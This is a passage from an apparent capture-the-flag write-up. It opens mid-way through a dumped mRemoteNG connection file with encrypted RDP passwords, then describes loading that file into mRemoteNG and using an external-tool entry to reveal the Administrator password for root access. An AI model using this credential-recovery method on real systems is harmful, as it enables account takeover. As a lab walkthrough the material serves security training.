Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot; Hostname=&quot;127.0.0.1&quot; Protocol=&quot;RDP&quot; PuttySession=&quot;Default Settings&quot; Port=&quot;3389&quot; ConnectToConsole=&quot;false&quot; UseCredSsp=&quot;true&quot; RenderingEngine=&quot;IE&quot; ICAEncryptionStrength=&quot;EncrBasic&quot; RDPAuthenticationLevel=&quot;NoAuth&quot; RDPMinutesToIdleTimeout=&quot;0&quot; RDPAlertIdleTimeout=&quot;false&quot; LoadBalanceInfo=&quot;&quot; Colors=&quot;Colors16Bit&quot; Resolution=&quot;FitToWindow&quot; AutomaticResize=&quot;true&quot; DisplayWallpaper=&quot;false&quot; DisplayThemes=&quot;false&quot; EnableFontSmoothing=&quot;false&quot; EnableDesktopComposition=&quot;false&quot; CacheBitmaps=&quot;false&quot; RedirectDiskDrives=&quot;false&quot; RedirectPorts=&quot;false&quot; RedirectPrinters=&quot;false&quot; RedirectSmartCards=&quot;false&quot; RedirectSound=&quot;DoNotPlay&quot; SoundQuality=&quot;Dynamic&quot; RedirectKeys=&quot;false&quot; Connected=&quot;false&quot; PreExtApp=&quot;&quot; PostExtApp=&quot;&quot; MacAddress=&quot;&quot; UserField=&quot;&quot; ExtApp=&quot;&quot; VNCCompression=&quot;CompNone&quot; VNCEncoding=&quot;EncHextile&quot; VNCAuthMode=&quot;AuthVNC&quot; VNCProxyType=&quot;ProxyNone&quot; VNCProxyIP=&quot;&quot; VNCProxyPort=&quot;0&quot; VNCProxyUsername=&quot;&quot; VNCProxyPassword=&quot;&quot; VNCColors=&quot;ColNormal&quot; VNCSmartSizeMode=&quot;SmartSAspect&quot; VNCViewOnly=&quot;false&quot; RDGatewayUsageMethod=&quot;Never&quot; RDGatewayHostname=&quot;&quot; RDGatewayUseConnectionCredentials=&quot;Yes&quot; RDGatewayUsername=&quot;&quot; RDGatewayPassword=&quot;&quot; RDGatewayDomain=&quot;&quot; InheritCacheBitmaps=&quot;false&quot; InheritColors=&quot;false&quot; InheritDescription=&quot;false&quot; InheritDisplayThemes=&quot;false&quot; InheritDisplayWallpaper=&quot;false&quot; InheritEnableFontSmoothing=&quot;false&quot; InheritEnableDesktopComposition=&quot;false&quot; InheritDomain=&quot;false&quot; InheritIcon=&quot;false&quot; InheritPanel=&quot;false&quot; InheritPassword=&quot;false&quot; InheritPort=&quot;false&quot; InheritProtocol=&quot;false&quot; InheritPuttySession=&quot;false&quot; InheritRedirectDiskDrives=&quot;false&quot; InheritRedirectKeys=&quot;false&quot; InheritRedirectPorts=&quot;false&quot; InheritRedirectPrinters=&quot;false&quot; InheritRedirectSmartCards=&quot;false&quot; InheritRedirectSound=&quot;false&quot; InheritSoundQuality=&quot;false&quot; InheritResolution=&quot;false&quot; InheritAutomaticResize=&quot;false&quot; InheritUseConsoleSession=&quot;false&quot; InheritUseCredSsp=&quot;false&quot; InheritRenderingEngine=&quot;false&quot; InheritUsername=&quot;false&quot; InheritICAEncryptionStrength=&quot;false&quot; InheritRDPAuthenticationLevel=&quot;false&quot; InheritRDPMinutesToIdleTimeout=&quot;false&quot; InheritRDPAlertIdleTimeout=&quot;false&quot; InheritLoadBalanceInfo=&quot;false&quot; InheritPreExtApp=&quot;false&quot; InheritPostExtApp=&quot;false&quot; InheritMacAddress=&quot;false&quot; InheritUserField=&quot;false&quot; InheritExtApp=&quot;false&quot; InheritVNCCompression=&quot;false&quot; InheritVNCEncoding=&quot;false&quot; InheritVNCAuthMode=&quot;false&quot; InheritVNCProxyType=&quot;false&quot; InheritVNCProxyIP=&quot;false&quot; InheritVNCProxyPort=&quot;false&quot; InheritVNCProxyUsername=&quot;false&quot; InheritVNCProxyPassword=&quot;false&quot; InheritVNCColors=&quot;false&quot; InheritVNCSmartSizeMode=&quot;false&quot; InheritVNCViewOnly=&quot;false&quot; InheritRDGatewayUsageMethod=&quot;false&quot; InheritRDGatewayHostname=&quot;false&quot; InheritRDGatewayUseConnectionCredentials=&quot;false&quot; InheritRDGatewayUsername=&quot;false&quot; InheritRDGatewayPassword=&quot;false&quot; InheritRDGatewayDomain=&quot;false&quot; /&amp;gt; &amp;lt;Node Name=&quot;L4mpje-PC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;8d3579b2-e68e-48c1-8f0f-9ee1347c9128&quot; Username=&quot;L4mpje&quot; Domain=&quot;&quot; Password=&quot;yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB&quot; Hostname=&quot;192.168.1.75&quot; Protocol=&quot;RDP&quot; PuttySession=&quot;Default Settings&quot; Port=&quot;3389&quot; ConnectToConsole=&quot;false&quot; UseCredSsp=&quot;true&quot; RenderingEngine=&quot;IE&quot; ICAEncryptionStrength=&quot;EncrBasic&quot; RDPAuthenticationLevel=&quot;NoAuth&quot; RDPMinutesToIdleTimeout=&quot;0&quot; RDPAlertIdleTimeout=&quot;false&quot; LoadBalanceInfo=&quot;&quot; Colors=&quot;Colors16Bit&quot; Resolution=&quot;FitToWindow&quot; AutomaticResize=&quot;true&quot; DisplayWallpaper=&quot;false&quot; DisplayThemes=&quot;false&quot; EnableFontSmoothing=&quot;false&quot; EnableDesktopComposition=&quot;false&quot; CacheBitmaps=&quot;false&quot; RedirectDiskDrives=&quot;false&quot; RedirectPorts=&quot;false&quot; RedirectPrinters=&quot;false&quot; RedirectSmartCards=&quot;false&quot; RedirectSound=&quot;DoNotPlay&quot; SoundQuality=&quot;Dynamic&quot; RedirectKeys=&quot;false&quot; Connected=&quot;false&quot; PreExtApp=&quot;&quot; PostExtApp=&quot;&quot; MacAddress=&quot;&quot; UserField=&quot;&quot; ExtApp=&quot;&quot; VNCCompression=&quot;CompNone&quot; VNCEncoding=&quot;EncHextile&quot; VNCAuthMode=&quot;AuthVNC&quot; VNCProxyType=&quot;ProxyNone&quot; VNCProxyIP=&quot;&quot; VNCProxyPort=&quot;0&quot; VNCProxyUsername=&quot;&quot; VNCProxyPassword=&quot;&quot; VNCColors=&quot;ColNormal&quot; VNCSmartSizeMode=&quot;SmartSAspect&quot; VNCViewOnly=&quot;false&quot; RDGatewayUsageMethod=&quot;Never&quot; RDGatewayHostname=&quot;&quot; RDGatewayUseConnectionCredentials=&quot;Yes&quot; RDGatewayUsername=&quot;&quot; RDGatewayPassword=&quot;&quot; RDGatewayDomain=&quot;&quot; InheritCacheBitmaps=&quot;false&quot; InheritColors=&quot;false&quot; InheritDescription=&quot;false&quot; InheritDisplayThemes=&quot;false&quot; InheritDisplayWallpaper=&quot;false&quot; InheritEnableFontSmoothing=&quot;false&quot; InheritEnableDesktopComposition=&quot;false&quot; InheritDomain=&quot;false&quot; InheritIcon=&quot;false&quot; InheritPanel=&quot;false&quot; InheritPassword=&quot;false&quot; InheritPort=&quot;false&quot; InheritProtocol=&quot;false&quot; InheritPuttySession=&quot;false&quot; InheritRedirectDiskDrives=&quot;false&quot; InheritRedirectKeys=&quot;false&quot; InheritRedirectPorts=&quot;false&quot; InheritRedirectPrinters=&quot;false&quot; InheritRedirectSmartCards=&quot;false&quot; InheritRedirectSound=&quot;false&quot; InheritSoundQuality=&quot;false&quot; InheritResolution=&quot;false&quot; InheritAutomaticResize=&quot;false&quot; InheritUseConsoleSession=&quot;false&quot; InheritUseCredSsp=&quot;false&quot; InheritRenderingEngine=&quot;false&quot; InheritUsername=&quot;false&quot; InheritICAEncryptionStrength=&quot;false&quot; InheritRDPAuthenticationLevel=&quot;false&quot; InheritRDPMinutesToIdleTimeout=&quot;false&quot; InheritRDPAlertIdleTimeout=&quot;false&quot; InheritLoadBalanceInfo=&quot;false&quot; InheritPreExtApp=&quot;false&quot; InheritPostExtApp=&quot;false&quot; InheritMacAddress=&quot;false&quot; InheritUserField=&quot;false&quot; InheritExtApp=&quot;false&quot; InheritVNCCompression=&quot;false&quot; InheritVNCEncoding=&quot;false&quot; InheritVNCAuthMode=&quot;false&quot; InheritVNCProxyType=&quot;false&quot; InheritVNCProxyIP=&quot;false&quot; InheritVNCProxyPort=&quot;false&quot; InheritVNCProxyUsername=&quot;false&quot; InheritVNCProxyPassword=&quot;false&quot; InheritVNCColors=&quot;false&quot; InheritVNCSmartSizeMode=&quot;false&quot; InheritVNCViewOnly=&quot;false&quot; InheritRDGatewayUsageMethod=&quot;false&quot; InheritRDGatewayHostname=&quot;false&quot; InheritRDGatewayUseConnectionCredentials=&quot;false&quot; InheritRDGatewayUsername=&quot;false&quot; InheritRDGatewayPassword=&quot;false&quot; InheritRDGatewayDomain=&quot;false&quot; /&amp;gt; &amp;lt;/mrng:Connections&amp;gt; On close inspection I could see there was a connection defined for L4mpje, and another for Administrator. The Administrator password is what we want, but it’s encrypted.We’re given encryption details at the beginning of the file. One possible option is to take those details and try to decrypt it. But I don’t want to do that if we can get mRemoteNG to do the decryption for us.The forum posts suggested Google had the answers once we discovered which software was out of place. I found that an external command can be made  that will display the decrypted password!!!If you download the Zip version instead of installer, everything stays in the same folder, so it’ll be a little easier to manipulate. To get the connection details into mRemoteNG, copy the text that was extracted from the SSH session into an xml file and save it as confCons.xml.After copying the text, saving it, and opening mRemoteNG, I got an error:Turns out a straight copy of the text from the shell resulted in data not formed well, so I had to clean up the XML and reload. After that it worked great.Then the external tools script could be put in to extract the password.Admin password found!! With that you can log into the SSH with Administrator and grab the root flag!" } ]
